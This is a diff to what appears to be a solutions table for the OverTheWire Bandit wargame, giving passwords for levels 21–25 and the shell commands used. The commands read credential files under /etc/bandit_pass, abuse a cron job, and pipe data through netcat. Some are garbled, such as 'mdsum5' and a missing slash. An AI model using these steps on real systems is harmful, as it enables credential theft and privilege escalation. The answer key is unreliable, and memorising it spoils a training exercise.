@@ -20,3 +20,8 @@
 | 18 | x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO | `diff passwords.new passwords.old` |
 | 19 | cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8 | `ssh bandit18@bandit.labs.overwire.org "cat readme"` |
 | 20 | 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO | `find / -perm -4000 -user bandit20 2>/dev/null` `./bandit20-do cat /etc/bandit_pass/bandit20` |
+| 21 | EeoULMCra2q0dSkYj561DX7s1CpBuOBt | `nc -l localhost 1234 &` `./suconnect 1234` |
+| 22 | tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q | `cat /etc/cron.d/cronjob_bandit22` `cat /usr/bin/cronjob_bandit22.sh` `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`|
+| 23 | 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga | `echo "I am bandit23 \| mdsum5 \| cut -d ' ' -f 1` |
+| 24 | gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 | `cd /tmp` `mkdir myexploit` `nano /tmp/myexploit/exploit.sh` `cat /etc/bandit_pass/bandit24 > /tmp/myexploit/password.txt` `chmod 777 exploit.sh` `touch password.txt` `chmod 777 password.txt` `cp exploit.sh var/spool/bandit24/foo` |
+| 25 | iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 | `nano/tmp/loop.sh` `chmod 777 loop.sh` `touch list.txt` `chmod 777 list.txt` `./loop.sh` `cat list.txt \| nc localhost 30002` |
